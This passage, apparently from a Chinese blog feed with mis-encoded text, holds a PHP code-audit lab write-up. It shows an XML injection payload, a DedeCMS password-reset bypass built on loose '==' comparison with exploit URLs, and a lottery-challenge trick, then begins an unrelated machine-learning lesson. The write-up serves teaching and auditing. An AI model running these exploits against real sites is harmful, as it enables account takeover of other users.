&#123;</span><br><span class="line">      $format = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span> .</span><br><span class="line">        <span class="string">&#x27;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#x27;</span>;</span><br><span class="line">      $xml = sprintf($format, $user, $pass);</span><br><span class="line">      $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">      <span class="comment">// Perform the actual login.</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">&#x27;username&#x27;</span>], $_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>è¿™æ®µç¨‹åºä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç”¨XMLç»“æ„å­˜å‚¨ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µå®¹æ˜“é€ æˆXMLæ³¨å…¥ã€‚ç¬¬8è¡Œå’Œç¬¬9è¡Œä½¿ç”¨äº†<code>strpos</code>å‡½æ•°æ¥é˜²æ­¢ç”¨æˆ·è¾“å…¥çš„å‚æ•°åŒ…å«<code>&lt;</code>å’Œ<code> &gt;</code>è¿™ä¸ªä¸¤ä¸ªç¬¦å·ã€‚å…ˆæ¥çœ‹çœ‹<code>strpos</code>å‡½æ•°çš„å®šä¹‰ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614114602.png" alt=""></p>
<p>åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œå¼€å‘è€…åªè€ƒè™‘åˆ° <strong>strpos</strong> å‡½æ•°è¿”å› <strong>false</strong> çš„æƒ…å†µï¼Œå´å¿½ç•¥äº†åŒ¹é…åˆ°çš„å­—ç¬¦åœ¨é¦–ä½æ—¶ä¼šè¿”å› <strong>0</strong> çš„æƒ…å†µï¼Œå› ä¸º <strong>false</strong> å’Œ <strong>0</strong> çš„å–åå‡ä¸º <strong>true</strong>ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡é—­åˆ<code>&quot;</code>çš„æ–¹å¼æ¥æ³¨å…¥XMLã€‚Payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&quot;&#x2F;&gt;&lt;injected-tag%20property&#x3D;&quot;&amp;password&#x3D;&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä½†æ˜¯è¿™æ®µä»£ç <code>SimpleXMLElement</code>å¹¶æ²¡æœ‰æŒ‡å®šLIBXML_NOENTå‚æ•°ï¼Œä»è€Œä¸èƒ½è¯»å–å¤–éƒ¨å®ä½“ï¼Œä¸çŸ¥é“åœ¨è¿™ä¸ªåœ°æ–¹è¿™æ ·çš„XMLæ³¨å…¥èƒ½æœ‰ä»€ä¹ˆå±å®³ã€‚</p>
</blockquote>
<h2 id="0x02-å®ä¾‹åˆ†æ">0x02 å®ä¾‹åˆ†æ</h2>
<h3 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h3>
<p>é¦–å…ˆåœ¨åå°å¼€å¯ä¼šå‘˜åŠŸèƒ½ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614171333.png" alt=""></p>
<p>æ³¨å†Œä¸¤ä¸ªä¼šå‘˜ï¼Œ<strong>å¹¶ä¸”ä¸èƒ½è®¾ç½®å¯†ä¿é—®é¢˜</strong>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614171531.png" alt=""></p>
<p>åœ¨ç™»å½•è´¦å·test1çš„æƒ…å†µä¸‹è®¿é—®ä¸‹é¢é“¾æ¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecmsmember&#x2F;resetpassword.php?dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;3</span><br></pre></td></tr></table></figure>
<p>burpæŠ“åŒ…é‡æ”¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614173258.png" alt=""></p>
<p>ç„¶åå¸¦ç€idä¸keyè®¿é—®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614173531.png" alt=""></p>
<p>è‡ªåŠ¨å¡«å……äº†test2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®ã€‚</p>
<h3 id="ä»£ç åˆ†æ">ä»£ç åˆ†æ</h3>
<p>æ ¹æ®æ¼æ´urlå®šä½åˆ°<code>member\resetpassword.php</code>çš„<code>safequestion</code>æ“ä½œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $mid = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">    $sql = <span class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion)) $safequestion = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer)) $safeanswer = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$row[&#x27;safequestion&#x27;]:&quot;0&quot;  $row[&#x27;safeanswer&#x27;]:&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">&#x27;safequestion&#x27;</span>] == $safequestion &amp;&amp; $row[<span class="string">&#x27;safeanswer&#x27;</span>] == $safeanswer)</span><br><span class="line">    &#123;</span><br><span class="line">        sn($mid, $row[<span class="string">&#x27;userid&#x27;</span>], $row[<span class="string">&#x27;email&#x27;</span>], <span class="string">&#x27;N&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;å¯¹ä¸èµ·ï¼Œæ‚¨çš„å®‰å…¨é—®é¢˜æˆ–ç­”æ¡ˆå›ç­”é”™è¯¯&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå…ˆæ ¹æ®ä¼ å…¥çš„<code>id</code>å‚æ•°æŸ¥è¯¢å¯¹åº”ç”¨æˆ·çš„<code>å¯†ä¿é—®é¢˜ç­”æ¡ˆ</code> ã€<code>userid</code>ã€ <code>é‚®ç®±</code>ç­‰ä¿¡æ¯,æ¥ç€ä¸‹é¢è¿›è¡Œåˆ¤æ–­,å¦‚æœä¼ å…¥çš„<code>$safequestion</code>ä¸<code>$safeanswer</code>éç©ºä¸”ä¸ä¹‹å‰è®¾ç½®çš„ç›¸ç­‰,å°±è¿›å…¥<code>sn()</code>å‡½æ•°æ“ä½œ å®ƒè¿™é‡Œç”¨çš„æ˜¯ <code>==</code> è€Œé <code>===</code> æ¥åˆ¤æ–­,æ‰€ä»¥è¿™é‡Œæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614173931.png" alt=""></p>
<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨<code>safequestion=0.0&amp;safeanswer=</code>å³å¯ä½¿<code>$row['safequestion'] == $safequestion &amp;&amp; $row['safeanswer'] == $safeanswer)</code>ä¸ºtrue,è¿›å…¥<code>sn()</code>å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sn</span>(<span class="params">$mid,$userid,$mailto, $send = <span class="string">&#x27;Y&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    $tptim= (<span class="number">60</span>*<span class="number">10</span>);</span><br><span class="line">    $dtime = time();</span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(!is_array($row))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//å‘é€æ–°é‚®ä»¶ï¼›</span></span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">&#x27;INSERT&#x27;</span>,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//10åˆ†é’Ÿåå¯ä»¥å†æ¬¡å‘é€æ–°éªŒè¯ç ï¼›</span></span><br><span class="line">    <span class="keyword">elseif</span>($dtime - $tptim &gt; $row[<span class="string">&#x27;mailtime&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">&#x27;UPDATE&#x27;</span>,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡æ–°å‘é€æ–°çš„éªŒè¯ç ç¡®è®¤é‚®ä»¶ï¼›</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ShowMsg(<span class="string">&#x27;å¯¹ä¸èµ·ï¼Œè¯·10åˆ†é’Ÿåå†é‡æ–°ç”³è¯·&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä»£ç é€»è¾‘æ˜¯å…ˆæ ¹æ®<code>id</code>ä»<code>dede_pwd_tmp</code>æ•°æ®è¡¨ä¸­åˆ¤æ–­æ˜¯å¦æœ‰å¯¹åº”çš„å¯†ç è®°å½•,è‹¥è´¦å·ä¸ºç¬¬ä¸€æ¬¡ä¿®æ”¹å¯†ç ,è¿™é‡Œçš„<code>$row</code>å°±ä¼šç©º,è¿›å…¥<code>newmail()</code>å‡½æ•°,æ‰§è¡Œ<code>insert()</code>æ“ä½œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#uploads\member\resetpassword.php 73è¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newmail</span>(<span class="params">$mid, $userid, $mailto, $type, $send</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    $randval = random(<span class="number">8</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>($type == <span class="string">&#x27;INSERT&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = md5($randval);</span><br><span class="line">        $sql = <span class="string">&quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#x27;<span class="subst">$mid</span>&#x27;, &#x27;<span class="subst">$userid</span>&#x27;,  &#x27;<span class="subst">$key</span>&#x27;, &#x27;<span class="subst">$mailtime</span>&#x27;);&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($db-&gt;ExecuteNoneQuery($sql))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($send == <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($send == <span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">&#x27;ç¨åè·³è½¬åˆ°ä¿®æ”¹é¡µ&#x27;</span>, $cfg_basehost.$cfg_memberurl.<span class="string">&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;</span>.$mid.<span class="string">&quot;&amp;amp;key=&quot;</span>.$randval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å…ˆç”Ÿæˆä¸€ä¸ª8ä½çš„éšæœºå¯†ç å¹¶èµ‹å€¼ç»™<code>$randval</code>,ç„¶åå°†å…¶ç”¨md5åŠ å¯†,å­˜å‚¨åˆ°<code>dede__pwd_tmp</code>è¡¨ä¸­,æ¥ç€åˆ°äº†æ¼æ´çš„è§¦å‘ç‚¹,è¿›å…¥<code>$send == 'N'</code>çš„æ“ä½œ,å°†æœªç»md5åŠ å¯†çš„<code>$randval</code>ä¼ ç»™äº†ç”¨æˆ·ã€‚</p>
<p>é‚£ä¹ˆè¿™é‡Œæ‹¼æ¥çš„urlå°±ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è·Ÿè¿›<code>dopost=getpasswd</code>çš„æ“ä½œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//ä¿®æ”¹å¯†ç </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;å¯¹ä¸èµ·ï¼Œè¯·ä¸è¦éæ³•æäº¤&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">    $row = $db-&gt;GetOne(<span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($row))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;å¯¹ä¸èµ·ï¼Œè¯·ä¸è¦éæ³•æäº¤&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($setp))</span><br><span class="line">    &#123;</span><br><span class="line">        $tptim= (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">3</span>);</span><br><span class="line">        $dtime = time();</span><br><span class="line">        <span class="keyword">if</span>($dtime - $tptim &gt; $row[<span class="string">&#x27;mailtime&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $db-&gt;executenonequery(<span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>);</span><br><span class="line">            ShowMsg(<span class="string">&quot;å¯¹ä¸èµ·ï¼Œä¸´æ—¶å¯†ç ä¿®æ”¹æœŸé™å·²è¿‡æœŸ&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword2.htm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>($setp == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($key)) $pwdtmp = $key;</span><br><span class="line"></span><br><span class="line">        $sn = md5(trim($pwdtmp));</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">&#x27;pwd&#x27;</span>] == $sn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($pwd != <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($pwd == $pwdok)</span><br><span class="line">                &#123;</span><br><span class="line">                    $pwdok = md5($pwdok);</span><br><span class="line">                    $sql = <span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">                    $db-&gt;executenonequery($sql);</span><br><span class="line">                    $sql = <span class="string">&quot;UPDATE `#@__member` SET `pwd` = &#x27;<span class="subst">$pwdok</span>&#x27; WHERE `mid` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>($db-&gt;executenonequery($sql))</span><br><span class="line">                    &#123;</span><br><span class="line">                        showmsg(<span class="string">&#x27;æ›´æ”¹å¯†ç æˆåŠŸï¼Œè¯·ç‰¢è®°æ–°å¯†ç &#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            showmsg(<span class="string">&#x27;å¯¹ä¸èµ·ï¼Œæ–°å¯†ç ä¸ºç©ºæˆ–å¡«å†™ä¸ä¸€è‡´&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        showmsg(<span class="string">&#x27;å¯¹ä¸èµ·ï¼Œä¸´æ—¶å¯†ç é”™è¯¯&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå…ˆåˆ¤æ–­<code>id</code>æ˜¯å¦æ‰§è¡Œè¿‡é‡ç½®å¯†ç çš„æ“ä½œå¦‚æœæ²¡æœ‰åˆ™é€€å‡ºï¼Œæ¥ç€è¿›å…¥äº†<code>empty($setp)</code>çš„æ“ä½œï¼Œåˆ¤æ–­æ˜¯å¦è¶…è¿‡ä¿®æ”¹æœŸé™ï¼Œæœ€ååŒ…å«äº†<code>resetpassword2.htm</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614175327.png" alt=""></p>
<p>é¡µé¢è®¾ç½®äº†setpä¸º2ï¼Œè¿›å…¥<code>$setp == 2</code>çš„æ“ä½œï¼Œè¿™é‡Œåˆ¤æ–­äº†<code>$sn</code>ä¸<code>dede_pwd_tmp</code>çš„<code>pwd</code>å€¼(<code>$key</code>)æ˜¯å¦ç›¸ç­‰,å› ä¸º<br>
<code>$sn=md5($randval)=$row['pwd']</code>ï¼Œè¿™æ ·å°±å¯ä»¥é‡ç½®å¯†ç äº†ã€‚</p>
<h2 id="0x03-ç»ƒä¹ é¢˜">0x03 ç»ƒä¹ é¢˜</h2>
<p>é¢˜ç›®é“¾æ¥: <a href="https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ">https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ</a> å¯†ç : 59t2</p>
<p>è¿™é“é¢˜ä¹‹å‰åšè¿‡ï¼Œé—®é¢˜å‡ºç°åœ¨<code>api.php</code>ä¸­çš„<code>buy</code>å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params">$req</span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	$money = $_SESSION[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	$numbers = $req[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	$win_numbers = random_win_nums();</span><br><span class="line">	$same_count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…³é”®ç‚¹åœ¨ç¬¬10è¡Œä»£ç ï¼Œå®ƒä½¿ç”¨<code>==</code>è¿›è¡Œæ¯”è¾ƒï¼Œè€Œè¯­è¨€å®šä¹‰ï¼Œé™¤äº† <strong>0ã€falseã€null</strong> ä»¥å¤–å‡ä¸º <strong>true</strong> ï¼Œæ‰€ä»¥ä½¿ç”¨ <strong>true</strong> å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œè¿”å›çš„å€¼è‚¯å®šæ˜¯ <strong>true</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠ“åŒ…ä¿®æ”¹æ•°æ®æäº¤7ä¸ª<strong>true</strong>ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614212409.png" alt=""></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_Learning-Week1</title>
    <url>/Machine_learning/basic_learning/1.Machine-Learning-Week1/</url>
    <content><![CDATA[<h1 id="Machine-Learning-Week1">Machine_Learning-Week1</h1>
<h3 id="æœºå™¨å­¦ä¹ ä»‹ç»">æœºå™¨å­¦ä¹ ä»‹ç»</h3>
<p>ä»€ä¹ˆæ˜¯æœºå™¨å­¦ä¹ ï¼Ÿè§†é¢‘ä¸­ç»™å‡ºäº†ä¸¤ç§å®šä¹‰ï¼Œä»å…·ä½“ç†è§£æ¥çœ‹ï¼Œæˆ‘æ›´å€¾å‘äºTom Mitchellçš„å®šä¹‰ï¼ŒåŸæ–‡æ˜¯ï¼š</p>
<blockquote>
<p>A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.</p>
</blockquote>
<p>ç”¨DeepMindä¸‹å›´æ£‹æ¥è§£é‡Šå°±æ˜¯ï¼š</p>
<p>Eï¼šä¸‹å¾ˆå¤šåœºå›´æ£‹çš„ä½“éªŒ</p>
<p>Tï¼šæŸä¸€å±€ä¸‹æ£‹çš„ä»»åŠ¡</p>
<p>Pï¼šDeepMindèµ¢å¾—æ¯”èµ›çš„å¯èƒ½æ€§</p>
<p>æ€»ä½“æ¥è¯´ï¼Œæœºå™¨å­¦ä¹ å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼š<strong>ç›‘ç£å­¦ä¹ ï¼ˆsupervised learningï¼‰<strong>å’Œ</strong>æ— ç›‘ç£å­¦ä¹ ï¼ˆunsupervised learningï¼‰</strong>ã€‚</p>
<h4 id="ç›‘ç£å­¦ä¹ ">ç›‘ç£å­¦ä¹ </h4>
<p>åœ¨ç›‘ç£å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬äº‹å…ˆå°±æœ‰äº†ä¸€ä¸ªæ•°æ®é›†ï¼Œå¹¶ä¸”å·²ç»çŸ¥é“æ­£ç¡®çš„è¾“å‡ºåº”è¯¥æ˜¯ä»€ä¹ˆæ ·å­ï¼Œå¹¶è®¤ä¸ºè¾“å…¥å’Œè¾“å‡ºä¹‹é—´å­˜åœ¨æŸç§è”ç³»ã€‚</p>
<p>ç›‘ç£å­¦ä¹ é—®é¢˜åˆ†ä¸ºâ€œ<strong>å›å½’ï¼ˆregressionï¼‰</strong>â€å’Œâ€œ<strong>åˆ†ç±»ï¼ˆclassificationï¼‰</strong>â€é—®é¢˜ã€‚</p>
<p>åœ¨å›å½’é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬è¯•å›¾é¢„æµ‹è¿ç»­è¾“å‡ºä¸­çš„ç»“æœï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¯•å›¾å°†è¾“å…¥å˜é‡æ˜ å°„åˆ°æŸä¸ªè¿ç»­å‡½æ•°ã€‚</p>
<p>åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬æ”¹ä¸ºå°è¯•é¢„æµ‹ç¦»æ•£è¾“å‡ºä¸­çš„ç»“æœã€‚ æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬æ­£åœ¨å°è¯•å°†è¾“å…¥å˜é‡æ˜ å°„ä¸ºç¦»æ•£ç±»åˆ«ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025141103.png" alt=""></p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼š</p>
<p>ç»™å®šæ•°æ®ï¼Œé¢„æµ‹æˆ¿å±‹çš„å…·ä½“ä»·æ ¼ã€‚åˆ¤æ–­æ˜¯å›å½’é—®é¢˜è¿˜æ˜¯åˆ†ç±»é—®é¢˜ï¼Œä»·æ ¼ä½œä¸ºè§„æ¨¡çš„å‡½æ•°æ˜¯ä¸€ä¸ªè¿ç»­çš„è¾“å‡ºï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªå›å½’é—®é¢˜ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æŠŠè¾“å‡ºæ”¹å˜ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å‡ºå…³äºæˆ¿å±‹æ˜¯å¦â€œä»¥é«˜äºæˆ–ä½äºè¦ä»·çš„ä»·æ ¼å‡ºå”®â€çš„è¾“å‡ºï¼Œä»è€Œå°†è¿™ä¸ªç¤ºä¾‹è½¬å˜ä¸ºåˆ†ç±»é—®é¢˜ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ ¹æ®ä»·æ ¼å°†æˆ¿å±‹åˆ†ä¸ºä¸¤ä¸ªç¦»æ•£ç±»åˆ«ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªæœºå™¨å­¦ä¹ çš„é—®é¢˜æ˜¯åˆ†ç±»é—®é¢˜è¿˜æ˜¯å›å½’é—®é¢˜ï¼Œæˆ‘ä»¬çœ‹çš„æ˜¯å®ƒçš„<strong>è¾“å‡ºç±»å‹</strong>ï¼Œå¦‚æœæ˜¯ç¦»æ•£æ•°æ®é‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªåˆ†ç±»é—®é¢˜ï¼Œå¦‚æœæ˜¯<strong>è¿ç»­æ•°æ®</strong>ï¼Œé‚£ä¹ˆå°±æ˜¯å›å½’é—®é¢˜ã€‚</p>
<h4 id="æ— ç›‘ç£å­¦ä¹ ">æ— ç›‘ç£å­¦ä¹ </h4>
<p>æˆ‘ä»¬æœ‰ä¸€äº›é—®é¢˜ï¼Œä½†æ˜¯ä¸çŸ¥é“ç­”æ¡ˆï¼Œæˆ‘ä»¬è¦åšçš„æ— ç›‘ç£å­¦ä¹ å°±æ˜¯æŒ‰ç…§ä»–ä»¬çš„æ€§è´¨æŠŠä»–ä»¬è‡ªåŠ¨åœ°åˆ†æˆå¾ˆå¤šç»„ï¼Œæ¯ç»„çš„é—®é¢˜æ˜¯å…·æœ‰ç±»ä¼¼æ€§è´¨çš„ï¼ˆæ¯”å¦‚æ•°å­¦é—®é¢˜ä¼šèšé›†åœ¨ä¸€ç»„ï¼Œè‹±è¯­é—®é¢˜ä¼šèšé›†åœ¨ä¸€ç»„ï¼Œç‰©ç†â€¦ï¼‰ã€‚</p>
